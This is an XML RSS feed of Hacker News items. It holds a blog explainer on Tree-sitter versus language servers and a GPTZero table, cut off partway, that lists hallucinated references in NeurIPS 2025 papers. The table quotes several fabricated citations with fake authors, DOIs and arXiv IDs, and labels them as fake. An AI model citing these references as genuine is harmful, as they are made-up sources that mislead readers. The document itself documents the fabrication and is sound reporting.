<?xml version='1.0' encoding='UTF-8'?>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Hacker News: Front Page</title><link>https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml</link><description>Hacker News RSS</description><atom:link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Thu, 22 Jan 2026 23:40:17 +0000</lastBuildDate><item><title>Tree-sitter vs. Language Servers</title><link>https://lambdaland.org/posts/2026-01-21_tree-sitter_vs_lsp/</link><description>&lt;doc fingerprint="f7a20d9fabe23cdc"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Explainer: Tree-sitter vs. LSP&lt;/head&gt;
    &lt;head rend="h5"&gt;21 Jan 2026&lt;/head&gt;
    &lt;p&gt;I got asked a good question today: what is the difference between Tree-sitter and a language server? I don’t understand how either of these tools work in depth, so I’m just going to explain from an observable, pragmatic point of view.&lt;/p&gt;
    &lt;head rend="h2"&gt;Tree-sitter #&lt;/head&gt;
    &lt;p&gt;Tree-sitter is a parser generator. What this means is that you can hand Tree-sitter a description for a programming language and it will create a program that will parse that language for you. What’s special about Tree-sitter is that it is a.) fast, and b.) can tolerate syntax errors in the input. These two properties make Tree-sitter ideal for creating syntax highlighting engines in text editors. When you’re editing a program, most of the time the program will be in a syntactically invalid state. During that time, you don’t want your colors changing or just outright breaking while you’re typing. Naïve regex-based syntax highlighters frequently suffer from this issue.&lt;/p&gt;
    &lt;p&gt;Tree-sitter also provides a query language where you can make queries against the parse tree. I use this in the Emacs package I’m trying to develop to add Typst support to the Citar citation/bibliography tool: I can ask Tree-sitter to find a particular syntax object; it is safer and more robust than using a regular expression because it can do similar parsing to the Typst engine itself.&lt;/p&gt;
    &lt;p&gt;In short, Tree-sitter provides syntax highlighting that is faithful to how the language implementation parses the program, instead of relying on regular expressions that incidentally come close.&lt;/p&gt;
    &lt;head rend="h2"&gt;Language server #&lt;/head&gt;
    &lt;p&gt;A language server is a program that can analyze a program and report interesting information about that program to a text editor. A standard, called the Language Server Protocol (LSP), defines the kinds of JSON messages that pass between a text editor and the server. The protocol is an open standard; any language and any text editor can take advantage of the protocol to get nice smart programming helps in their system. Language servers can provide information like locating the definition of a symbol, possible completions at the cursor point, etc. to a text editor which can then decide how and when to display or use this information.&lt;/p&gt;
    &lt;p&gt;Language servers solve the “ \(N \times M\) problem” where \(N\) programming languages and \(M\) text editors would mean there have to be \(N \times M\) implementations for language analyzers. Now, every language just needs a language server, and every editor needs to be able to speak the LSP protocol.&lt;/p&gt;
    &lt;p&gt;Language servers are powerful because they can hook into the language’s runtime and compiler toolchain to get semantically correct answers to user queries. For example, suppose you have two versions of a &lt;code&gt;pop&lt;/code&gt; function, one imported from a &lt;code&gt;stack&lt;/code&gt; library, and another from a &lt;code&gt;heap&lt;/code&gt; library. If you use a tool like the dumb-jump package in Emacs


I just want to say that I think dumb-jump is very cool and I am not trying to knock it down at all. It’s honest about its limitations and can be handy when you do not have a language server available.

and you use it to jump to the definition for a call to &lt;code&gt;pop&lt;/code&gt;, it might get confused as to where to go because it’s not sure what module is in scope at the point. A language server, on the other hand, should have access to this information and would not get confused.&lt;/p&gt;
    &lt;head rend="h3"&gt;Using a language server for highlighting #&lt;/head&gt;
    &lt;p&gt;It is possible to use the language server for syntax highlighting. I am not aware of any particularly strong reasons why one would want to (or not want to) do this. The language server can be a more complicated program and so could surface particularly detailed information about the syntax; it might also be slower than tree-sitter.&lt;/p&gt;
    &lt;p&gt;Emacs’ built-in LSP client, Eglot, recently added &lt;code&gt;eglot-semantic-tokens-mode&lt;/code&gt; to support syntax highlighting as provided from the language server. I have tried this a little bit in Rust code and it seems fine; the Tree-sitter-based syntax highlighting has been working just fine for me, so I will probably stick to that unless I find a compelling reason to use the LSP-based highlighting.&lt;/p&gt;
    &lt;p&gt;Update: Thanks to a comment on HN, I now know of a good reason why you would want to use a language server for syntax highlighting: the Rust language server rust-analyzer can tell your text editor when a variable reference is mutable or not, which means you could highlight &lt;code&gt;mut&lt;/code&gt; references differently than non-&lt;code&gt;mut&lt;/code&gt; ones. Thanks to David Barsky for the tip!&lt;/p&gt;
    &lt;head rend="h2"&gt;Meta aside: the LLM angle #&lt;/head&gt;
    &lt;p&gt;I wrote all of the above article. I did not ask an LLM to generate any portion of it. Please know that whenever you read something on my blog, it comes 100% from a human—me, Ashton Wiersdorf.&lt;/p&gt;
    &lt;p&gt;I am not so anti-AI to say that LLMs are worthless or should never be used. I’ve used LLMs a little bit. I think they’re fantastic at translating between languages; this seems to be something that they should be good at doing. They’re helpful at writing some boring parts of the code I write. However, most of the time I find that I can typically write the tricky bits of the code about as fast as I could specify to an LLM what I want.&lt;/p&gt;
    &lt;p&gt;I know that an LLM could have generated a facile pile of text much like the above, and honestly it would probably be decently helpful. However, know that what you have just read came directly from the fingers of a person who thought about the topic and bent his effort to helping you understand. This is from real human who understands the meaning behind each word here. I do not play games with syntax and generate answer-shaped blog posts. There is real meaning here. Enjoy it, and go forth and make more of it.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46719899</guid><pubDate>Thu, 22 Jan 2026 14:47:58 +0000</pubDate></item><item><title>GPTZero finds 100 new hallucinations in NeurIPS 2025 accepted papers</title><link>https://gptzero.me/news/neurips/</link><description>&lt;doc fingerprint="3b56a9bbb164ebc9"&gt;
  &lt;main&gt;
    &lt;row style="height:27.75pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#356854;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Published Paper&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#356854;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;GPTZero Scan&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#356854;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Example of Verified Hallucination&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#356854;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Comment&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;SimWorld: An Open-ended Simulator for Agents in Physical and Social Worlds&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;John Doe and Jane Smith. Webvoyager: Building an end-to-end web agent with large multimodal models. arXiv preprint arXiv:2401.00001, 2024.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Article with a matching title exists here. Authors are obviously fabricated. arXiv ID links to a different article.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:64.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Unmasking Puppeteers: Leveraging Biometric Leakage to Expose Impersonation in AI-Based Videoconferencing&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI*&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;John Smith and Jane Doe. Deep learning techniques for avatar-based interaction in virtual environments. IEEE Transactions on Neural Networks and Learning Systems, 32(12):5600-5612, 2021. doi: 10.1109/ TNNLS.2021.3071234. URL https://ieeexplore.ieee.org/document/307123&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. Doesn't exist in publication. URL and DOI are fake.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:77.25pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Unmasking Puppeteers: Leveraging Biometric Leakage to Expose Impersonation in AI-Based Videoconferencing&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI*&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Min-Jun Lee and Soo-Young Kim. Generative adversarial networks for hyper-realistic avatar creation. In Proceedings of the IEEE/CVF Conference on Computer Vision and Pattern Recognition (CVPR), pages 1234-1243, 2022. doi: 10.1109/CVPR.2022.001234. URL https://ieeexplore.ieee.org/ document/00123&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. Doesn't exist in publication. URL and DOI are fake.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;SimWorld-Robotics: Synthesizing Photorealistic and Dynamic Urban Environments for Multimodal Robot Navigation and Collaboration&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI*&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Firstname Lastname and Others. Drivlme: A large-scale multi-agent driving benchmark, 2023. URL or arXiv ID to be updated.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No title or author match. Potentially referring to this article, but year is off (2024)&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;SimWorld-Robotics: Synthesizing Photorealistic and Dynamic Urban Environments for Multimodal Robot Navigation and Collaboration&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI*&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Firstname Lastname and Others. Robotslang: Grounded natural language for multi-robot object search, 2024. To appear.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No title or author match. Potentially referring to this article, but year is totally off (2020).&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Efficient semantic uncertainty quantification in language models via diversity-steered sampling&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Nuo Lou and et al. Dsp: Diffusion-based span prediction for masked text modeling. arXiv preprint arXiv:2305.XXXX, 2023.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No title or author match and arXiv ID is incomplete.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Efficient semantic uncertainty quantification in language models via diversity-steered sampling&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;A. Sahoo and et al. inatk: Iterative noise aware text denoising. arXiv preprint arXiv:2402.XXXX, 2024.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No title or author match and arXiv ID is incomplete.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Efficient semantic uncertainty quantification in language models via diversity-steered sampling&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sheng Shi and et al. Maskgpt: Uniform denoising diffusion for language. arXiv preprint arXiv:2401.XXXX, 2024.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No title or author match and arXiv ID is incomplete.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:52.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Efficient semantic uncertainty quantification in language models via diversity-steered sampling&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Asma Issa, George Mohler, and John Johnson. Paraphrase identification using deep contextualized representations. In Proceedings of the 2018 Conference on Empirical Methods in Natural Language Processing (EMNLP), pp. 517-526, 2018.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. No match in publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:77.25pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Efficient semantic uncertainty quantification in language models via diversity-steered sampling&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Yi Tay, Kelvin Fu, Kai Wu, Ivan Casanueva, Jianfeng Liu, Byron Wallace, Shuohang Wang, Bajrang Singh, and Julian McAuley. Reasoning with heterogeneous graph representations for knowledge-aware question answering. In Findings of the Association for Computational Linguistics: ACL 2021, pp. 3497-3506, 2021.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No exact author or title match, although this title is close. No match in the publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:52.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Efficient semantic uncertainty quantification in language models via diversity-steered sampling&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Alex Wang, Rishi Bommasani, Dan Hendrycks, Daniel Song, and Zhilin Zhang. Efficient fewshot learning with efl: A single transformer for all tasks. In arXiv preprint arXiv:2107.13586, 2021.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No title or author match. ArXiv ID leads to a different article.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:52.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
